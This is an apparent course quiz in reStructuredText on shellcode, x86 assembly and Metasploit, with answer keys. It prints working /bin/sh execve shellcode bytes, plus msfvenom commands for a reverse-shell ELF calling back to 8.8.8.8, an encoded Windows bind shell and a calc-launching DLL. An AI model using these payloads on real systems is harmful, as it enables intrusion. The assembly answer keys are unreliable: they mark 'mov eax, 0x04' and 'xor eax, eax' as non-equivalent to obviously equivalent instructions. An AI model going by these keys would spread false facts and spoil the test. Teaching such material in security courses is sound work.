MCQ 6: Shellcode
****************

Question 1.Hand Made
--------------------

.. question:: shell
   :nb_prop: 4
   :nb_pos: 1

   | Consider the following shell code:

   .. code-block:: bash

        xor     eax, eax    ;Clearing eax register
        push    eax         ;Pushing NULL bytes
        push    0x68732f2f  ;Pushing //sh
        push    0x6e69622f  ;Pushing /bin
        mov     ebx, esp    ;ebx now has address of /bin//sh
        push    eax         ;Pushing NULL byte
        mov     edx, esp    ;edx now has address of NULL byte
        push    ebx         ;Pushing address of /bin//sh
        mov     ecx, esp    ;ecx now has address of address
                            ;of /bin//sh byte
        mov     al, 11      ;syscall number of execve is 11
        int     0x80        ;Make the system call

        $ nasm -f elf shellcode.nasm
        $ objdump -d -M intel shellcode.o

        shellcode.o:     file format elf32-i386


        Disassembly of section .text:

        00000000 <.text>:
           0:	31 c0                	xor    eax,eax
           2:	50                   	push   eax
           3:	68 2f 2f 73 68       	push   0x68732f2f
           8:	68 2f 62 69 6e       	push   0x6e69622f
           d:	89 e3                	mov    ebx,esp
           f:	50                   	push   eax
          10:	89 e2                	mov    edx,esp
          12:	53                   	push   ebx
          13:	89 e1                	mov    ecx,esp
          15:	b0 0b                	mov    al,0xb
          17:	cd 80                	int    0x80


   | What would the resulting shellcode if this program ?

   .. positive::

      - ``\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69``
        ``\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80``

   .. negative::

      - ``\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1``
        ``\xb0\x0b\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68``

   .. negative::

      - ``\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69``
        ``\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1``


   .. negative::

      - ``\x31\xca\xff\xee\xba\xbe\x73\x68\x68\x2f\x62\x69``
        ``\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80``

Question 2. Assembly
---------------------

..
    TODO have solution

.. question:: ass1
   :nb_prop: 5
   :nb_pos: 1

   |  Which of the following assembly instructions are equivalent to the instruction  ``mov eax, 4`` ?

   .. negative::

      -  ``mov ax, 4``

   .. negative::

      - ``mov al 4``

   .. negative::

      - ``mov ah 4``

   .. negative::

      - ``mov eax, 0x04``

   .. positive::

      - ``mov eax, 0x4``

.. question:: ass2
   :nb_prop: 5
   :nb_pos: 1

   |  Which of the following assembly instructions are equivalent to the instruction ``mov eax, 0`` ?

   .. negative::

      -  ``mov ax, 0``

   .. negative::

      - ``mov al 0``

   .. negative::

      - ``mov ah 0``

   .. negative::

      - ``xor eax, eax``

   .. positive::

      - ``sub eax, eax``

.. question:: ass3
   :nb_prop: 4
   :nb_pos: 1

   |  Which of the following assembly instructions are correctly formatted shellcodes ?

   .. negative::

      .. code-block:: c

            mov eax, 4
            mov ebx, 1
            mov edx, 15
            int 0x80

   .. negative::

      .. code-block:: c

            mov eax, 0xbffff364
            sub eax, 0xbffff368
            xor ebx, eax
            inc ebx
            int 0x80

   .. negative::

      .. code-block:: c

            mov eax, 0xbffff364
            add eax, 0xbf00f368
            xor ebx, eax
            inc ebx
            int 0x80

   .. positive::

      .. code-block:: c

            mov eax, 0xbffff364
            add eax, 0xbff00368
            xor ebx, eax
            inc ebx
            int 0x80

Question 3. Metasploit
-----------------------

..
    From: https://www.duckademy.com/Metasploit-miniquiz1


.. question:: meta1
   :nb_prop: 4
   :nb_pos: 1

   |  Which programming language can be used to write Metasploit scripts for Metasploit 4.x Framework?

   .. negative::

      -  C

   .. negative::

      - Python

   .. negative::

      - C#

   .. positive::

      - Ruby


.. question:: meta2
   :nb_prop: 4
   :nb_pos: 1

   |  Check the true sentence about the following command:

   .. code-block:: c

        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=8.8.8.8 LPORT=420 -f elf > /root/Downloads/exploits/exploit.elf

   .. negative::

      - This command is used to create a reverse shell for window to host ``8.8.8.8`` on port 420 and return in ``elf`` format directly in the file ``exploit.elf``

   .. negative::

      - This command is used to create a reverse shell for window to host ``8.8.8.8`` on port 420 and return in ``perl`` format

   .. negative::

      -  This command is used to create a bind shell for window to host ``8.8.8.8`` on port 420 and return in ``perl`` format

   .. negative::

      -  This command is used to create a bind shell for linux  to host ``8.8.8.8`` on port 420 and return in ``perl`` format

   .. positive::

      - This command is used to create a reverse shell for linux to host ``8.8.8.8`` on port 420 and return in ``elf`` format directly in the file ``exploit.elf``

.. question:: meta3
   :nb_prop: 4
   :nb_pos: 1

   |  Check the true sentence about the following command:

   .. code-block:: c

        msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python --smallest

   .. negative::

      - This command is used to create a reverse shell for window to host ``8.8.8.8`` on port 420 and return in ``elf`` format directly in the file ``exploit.elf``

   .. negative::

      - This command is used to create a bind shell for linux 32 bits system and return in ``elf`` format in the smallest way possible while ignoring bad char ``\x00`` and using shikata_ga_nai encoder.

   .. negative::

      - This command is used to create a reverse shell for window 32 bits system and return in ``python`` format while ignoring bad char ``\x00`` and using shikata_ga_nai encoder.

   .. negative::

      - This command is used to create a reverse shell for linux 32 bits system and return in ``python`` format while ignoring bad char ``\x00`` and using shikata_ga_nai encoder.


   .. negative::

      - This command is used to create a bind shell for window 32 bits system and return in ``python`` format in the smallest way possible  and using shikata_ga_nai encoder.

   .. positive::

      - This command is used to create a bind shell for window 32 bits system and return in ``python`` format in the smallest way possible while ignoring bad char ``\x00`` and using shikata_ga_nai encoder.


.. question:: meta4
   :nb_prop: 2
   :nb_pos: 1

   |  Check the true sentence about the following command:

   .. code-block:: c

        msfvenom -f dll -p windows/exec CMD="C:\windows\system32\calc.exe" -o shell32.dll


   .. negative::

      - This command produce the dynamic link library (``.dll``) that launch the calculator on a linux architecture

   .. positive::

      - This command produce the dynamic link library (``.dll``) that launch the calculator on a window architecture